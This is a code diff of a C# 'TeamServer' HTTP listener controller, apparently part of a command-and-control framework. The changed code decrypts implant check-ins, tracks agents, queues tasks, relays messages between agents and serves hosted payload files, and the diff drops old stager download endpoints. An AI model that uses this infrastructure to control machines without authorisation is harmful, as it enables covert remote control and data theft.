@@ -1,5 +1,8 @@
-﻿using ApiModels.Response;
+﻿using ApiModels.Changes;
+using ApiModels.Response;
+using ApiModels.WebHost;
 using Microsoft.AspNetCore.Http;
+using Microsoft.AspNetCore.Http.Extensions;
 using Microsoft.AspNetCore.Mvc;
 using Microsoft.Extensions.Logging;
 using Newtonsoft.Json;
@@ -22,270 +25,219 @@ namespace TeamServer.Models
         private IListenerService _listenerService;
         private IBinMakerService _binMakerService;
         private ILoggerFactory _loggerFactory;
+        private readonly IChangeTrackingService _changeTrackingService;
+        private readonly IWebHostService _webHostService;
+        private readonly ICryptoService _cryptoService;
+        private readonly IAuditService _auditService;
 
-        public HttpListenerController(IAgentService agentService, IFileService fileService, IListenerService listenerService, IBinMakerService binMakerService, ILoggerFactory loggerFactory)
+        public HttpListenerController(IAgentService agentService,
+            IFileService fileService,
+            IListenerService listenerService,
+            IBinMakerService binMakerService,
+            ILoggerFactory loggerFactory,
+            IChangeTrackingService changeTrackingService,
+            IWebHostService webHostService,
+            ICryptoService cryptoService,
+            IAuditService auditService)
         {
             this._agentService=agentService;
             this._fileService = fileService;
             this._listenerService = listenerService;
             this._binMakerService = binMakerService;
             this._loggerFactory = loggerFactory;
+            this._changeTrackingService = changeTrackingService;
+            this._webHostService = webHostService;
+            this._cryptoService = cryptoService;
+            this._auditService = auditService;
         }
 
 
-        public async Task<IActionResult> WebHost(string id)
+        private async Task<IActionResult> WebHost(string path)
         {
+            Logger.Log($"WebHost request {path}");
             //var logger = _loggerFactory.CreateLogger("WebHost");
             //logger.LogInformation($"{id}");
-            string fileName = Path.GetFileName(id);
 
-            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
-
-            if (listener == null)
+            var log = new WebHostLog()
             {
-                //logger.LogError($"NOT FOUND {fileName} => No listener at {this.Request.GetListenerUri()}");
-                Logger.Log($"NOT FOUND {fileName} => No listener at {this.Request.GetListenerUri()}");
-                return this.NotFound();
-            }
+                Path = path,
+                Date = DateTime.UtcNow,
+                UserAgent = this.HttpContext.Request.Headers.ContainsKey("UserAgent") ?  this.HttpContext.Request.Headers["UserAgent"].ToString() : String.Empty,
+                Url = this.HttpContext.Request.GetDisplayUrl(),
+            };
 
-            var path = _fileService.GetListenerPath(listener.Name);
-            path = Path.Combine(path, fileName);
-
-            if (!System.IO.File.Exists(path))
+            try
             {
-                //logger.LogError($"NOT FOUND {fileName} from listener {listener.Name}");
-                Logger.Log($"NOT FOUND {fileName} from listener {listener.Name}");
-                return this.NotFound();
+                var fileContent = _webHostService.GetFile(path);
+
+                if (fileContent == null)
+                {
+                    //logger.LogError($"NOT FOUND {fileName} from listener {listener.Name}");
+                    //Logger.Log($"NOT FOUND {path}");
+                    log.StatusCode = 404;
+                    this._webHostService.Addlog(log);
+                    return this.NotFound();
+                }
+
+                //Logger.Log($"GET {path}");
+
+                log.StatusCode = 200;
+                this._webHostService.Addlog(log);
+                return this.File(fileContent, "application/octet-stream");
             }
+            catch (Exception ex)
+            {
+                Logger.Log($"WebHost Error : {ex}");
+                return NotFound("Error");
+            }
+        }
 
-            Logger.Log($"GET {fileName} from listener {listener.Name}");
-
-            return this.File(System.IO.File.ReadAllBytes(path), "application/octet-stream");
+        public async Task<IActionResult> HandleRequest(string relativeUrl)
+        {
+            if (HttpContext.Request.Method == "POST")
+            {
+                return await this.HandleImplant();
+            }
+            else
+            {
+                return await this.WebHost(relativeUrl);
+            }
         }
 
 
-        public async Task<IActionResult> HandleImplant()
+        private async Task<ActionResult> HandleImplant()
         {
+            //var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.BindPort == this.Request.Host.Port);
 
-            var metadata = ExtractMetadata(HttpContext.Request.Headers);
-            if (metadata == null)
-                return Content("<html>Hello</html>");
+            //var agent = this.CheckIn(id, listener);
 
-            var agent = this._agentService.GetAgent(metadata.Id);
+            string id = null;
+            var result = new List<MessageResult>();
+            string body;
+            using (var sr = new StreamReader(HttpContext.Request.Body))
+                body = await sr.ReadToEndAsync();
+
+
+            string json = null;
+            try
+            {
+                json = _cryptoService.DecryptFromBase64(body);
+                
+            }
+            catch
+            {
+                Logger.Log($"Error decrypting agent messages.");
+                //Decrypt failed
+                return NotFound();
+            }
+
+            try
+            {
+                result = JsonConvert.DeserializeObject<List<MessageResult>>(json);
+            }
+            catch
+            {
+                Logger.Log($"Error deserializing agent messages.");
+                //json in bad format
+                return NotFound();
+            }
+            
+
+            foreach (var messRes in result)
+            {
+                if (messRes.Header.Path.Count() == 1)
+                {
+                    id = messRes.Header.Owner;
+                    break;
+                }
+            }
+
+            if(string.IsNullOrEmpty(id))
+            {
+                //no main agent
+                return NotFound();
+            }
+
+            var messages = new List<MessageTask>();
+            try
+            {
+                foreach (var messRes in result)
+                {
+                    var agentId = messRes.Header.Owner;
+                    var messAgent = this.CheckIn(messRes.Header.Owner);
+
+                    if (messRes.MetaData != null)
+                    {
+                        messAgent.Metadata = messRes.MetaData;
+                        this._changeTrackingService.TrackChange(ChangingElement.Agent, messAgent.Id);
+                    }
+
+                    messAgent.AddTaskResults(messRes.Items);
+                    foreach (var res in messRes.Items)
+                        this._changeTrackingService.TrackChange(ChangingElement.Result, res.Id);
+
+                    messAgent.RelayId = id;
+                    if (messAgent.Path != messRes.Header.Path)
+                    {
+                        messAgent.Path = messRes.Header.Path;
+                        this._changeTrackingService.TrackChange(ChangingElement.Agent, messAgent.Id);
+                    }
+                    if (messRes.FileChunk != null)
+                        _fileService.AddAgentFileChunk(messRes.FileChunk);
+
+                    messAgent.AddProxyResponses(messRes.ProxyMessages);
+
+                    ////Logger.Log($"Saving resulst of {messAgent.Metadata.Id}");
+                    _fileService.SaveResults(messAgent, messRes.Items);
+                }
+
+
+                
+                foreach (var ag in this._agentService.GetAgentToRelay(id))
+                {
+                    var mess = ag.GetNextMessage();
+                    if (mess != null)
+                        messages.Add(mess);
+                }
+            }
+            catch(Exception ex)
+            {
+                System.Diagnostics.Debug.WriteLine(ex.ToString());
+                throw;
+            }
+
+            var camelSettings = new JsonSerializerSettings { ContractResolver = new Newtonsoft.Json.Serialization.CamelCasePropertyNamesContractResolver() };
+            var ret = JsonConvert.SerializeObject(messages, camelSettings);
+            var enc = this._cryptoService.EncryptAsBase64(ret);
+
+            if (enc.Length == 0)
+            {
+                int i = 0;
+            }
+
+            return Ok(enc);
+        }
+
+        private Agent CheckIn(string agentId)
+        {
+            var agent = this._agentService.GetAgent(agentId);
+
+            this._changeTrackingService.TrackChange(ChangingElement.Agent, agentId);
+
             if (agent == null)
             {
-                agent = new Agent(metadata);
+                agent = new Agent(agentId);
                 this._agentService.AddAgent(agent);
+                var meta = new AgentTask() { Command = "meta", Id = Guid.NewGuid().ToString(), Label = "MetaData", RequestDate = DateTime.UtcNow };
+                agent.QueueTask(meta);
+                this._changeTrackingService.TrackChange(ChangingElement.Task, meta.Id);
+
+                this._auditService.Record(AuditType.Info, AuditCategory.Agent, agentId, string.Empty, $"Agent Checking In");
             }
 
             agent.CheckIn();
 
-            //string calledUri = this.Request.GetListenerUri();
-
-            //System.IO.File.AppendAllText("log.log", calledUri + Environment.NewLine);
-
-            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
-            if (listener != null)
-            {
-                //System.IO.File.AppendAllText("log.log", $"Found listener {listener.Id} with {listener.Uri}" + Environment.NewLine);
-                agent.ListenerId = listener.Id;
-            }
-
-            if (HttpContext.Request.Method == "POST")
-            {
-                string json;
-                using (var sr = new StreamReader(HttpContext.Request.Body))
-                    json = await sr.ReadToEndAsync();
-
-                var results = JsonConvert.DeserializeObject<IEnumerable<AgentTaskResult>>(json);
-
-                agent.AddTaskResults(results);
-
-                //Logger.Log($"Saving resulst of {agent.Metadata.Id}");
-                _fileService.SaveResults(agent, results);
-            }
-
-
-            var tasks = agent.GetPendingTaks();
-
-            return Ok(tasks);
+            return agent;
         }
-
-
-
-        private AgentMetadata ExtractMetadata(IHeaderDictionary headers)
-        {
-            //Auhorization: Bearer <base64>
-            if (!headers.TryGetValue("Authorization", out var encodedMetaDataHeader))
-                return null;
-
-            var encodedMetaData = encodedMetaDataHeader.ToString();
-
-            if (!encodedMetaData.StartsWith("Bearer "))
-                return null;
-
-            encodedMetaData = encodedMetaData.Substring(7, encodedMetaData.Length - 7);
-
-            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetaData));
-            return JsonConvert.DeserializeObject<AgentMetadata>(json);
-        }
-
-        #region Download
-        public IActionResult SetupDownload(string id)
-        {
-            var desc = _fileService.GetFile(id);
-            if (desc == null)
-                return NotFound();
-
-            return Ok(new FileDescriptorResponse()
-            {
-                Id = desc.Id,
-                Name = desc.Name,
-                Length = desc.Length,
-                ChunkCount = desc.ChunkCount,
-                ChunkSize = desc.ChunkSize,
-            });
-        }
-
-        [HttpGet("DownloadChunk/{id}/{chunkIndex}")]
-        public IActionResult DownloadChunk(string id, int chunkIndex)
-        {
-            var desc = _fileService.GetFile(id);
-            if (chunkIndex < 0 || chunkIndex >= desc.ChunkCount)
-                return NotFound();
-
-            var chunck = desc.Chunks[chunkIndex];
-            chunck.IsDownloaded = true;
-
-            _fileService.CleanDownloaded();
-
-            //Logger.Log($"File {desc.Name} => Downloading chunck #{chunck.Index} with length of {chunck.Data.Length} | index requested = {chunkIndex} of {desc.Chunks.Count}");
-
-            //if(desc.IsDownloaded)
-            //    Logger.Log($"File {desc.Name} uploaded with {desc.ChunkCount} chunks");
-
-            return Ok(new FileChunckResponse()
-            {
-                Data = chunck.Data,
-                FileId = chunck.FileId,
-                Index = chunck.Index,
-            });
-        }
-        #endregion
-
-        #region Upload
-        [HttpPost("Upload/Setup")]
-        public IActionResult SetupUpload([FromBody] FileDescriptor desc)
-        {
-            if (string.IsNullOrEmpty(desc.Id))
-                return NotFound();
-
-            _fileService.AddFile(desc);
-            return Ok();
-        }
-
-        [HttpPost("Upload/Chunk")]
-        public IActionResult UploadChunk([FromBody] FileChunk chunk)
-        {
-            var desc = _fileService.GetFile(chunk.FileId);
-            if (desc == null)
-                return NotFound();
-
-            var metadata = ExtractMetadata(HttpContext.Request.Headers);
-            if (metadata == null)
-                return NotFound();
-
-            desc.Chunks.Add(chunk);
-
-            return Ok();
-        }
-        #endregion
-
-        //public IActionResult ModuleInfo([FromBody] AgentTaskResult res)
-        //{
-        //    //System.IO.File.AppendAllText("log.log", $"ModuleInfo called.{Environment.NewLine}");
-        //    foreach (var agent in this._agentService.GetAgents())
-        //    {
-        //        var existing = agent.GetTaskResult(res.Id);
-        //        if (existing != null)
-        //        {
-        //            //System.IO.File.AppendAllText("log.log", $"Found at {existing.Id}{Environment.NewLine}");
-        //            existing.Status = res.Status;
-        //            existing.Info = res.Info;
-        //            existing.Result = res.Result;
-
-        //            _fileService.SaveResults(agent, new List<AgentTaskResult> { existing });
-
-        //            break;
-        //        }
-        //    }
-
-        //    return Ok();
-        //}
-
-
-        //public IActionResult DownloadStagerExe()
-        //{
-        //    var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
-        //    if (listener == null)
-        //        return NotFound("No corresponding Listener");
-
-        //    var path = this._fileService.GetListenerPath(listener.Name);
-        //    var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentExeFileName);
-        //    if (!System.IO.File.Exists(fileName))
-        //        return NotFound();
-
-        //    byte[] fileBytes = null;
-        //    using (FileStream fs = System.IO.File.OpenRead(fileName))
-        //    {
-        //        fileBytes = new byte[fs.Length];
-        //        fs.Read(fileBytes, 0, (int)fs.Length);
-        //    }
-
-
-        //    return File(fileBytes, "application/octet-stream", "stager.exe");
-        //}
-
-        //public IActionResult DownloadStagerBin()
-        //{
-        //    var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
-        //    if (listener == null)
-        //        return NotFound("No corresponding Listener");
-
-        //    var path = this._fileService.GetListenerPath(listener.Name);
-        //    var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentBinFileName);
-        //    if (!System.IO.File.Exists(fileName))
-        //        return NotFound();
-
-        //    byte[] fileBytes = null;
-        //    using (FileStream fs = System.IO.File.OpenRead(fileName))
-        //    {
-        //        fileBytes = new byte[fs.Length];
-        //        fs.Read(fileBytes, 0, (int)fs.Length);
-        //    }
-
-        //    return File(fileBytes, "application/octet-stream", "stager.bin");
-        //}
-
-        //public IActionResult DownloadStagerDll()
-        //{
-        //    var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
-        //    if (listener == null)
-        //        return NotFound("No corresponding Listener");
-
-        //    var path = this._fileService.GetListenerPath(listener.Name);
-        //    var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentDllFileName);
-        //    if (!System.IO.File.Exists(fileName))
-        //        return NotFound();
-
-        //    byte[] fileBytes = null;
-        //    using (FileStream fs = System.IO.File.OpenRead(fileName))
-        //    {
-        //        fileBytes = new byte[fs.Length];
-        //        fs.Read(fileBytes, 0, (int)fs.Length);
-        //    }
-
-        //    return File(fileBytes, "application/octet-stream", "stager.dll");
-        //}
     }
 }
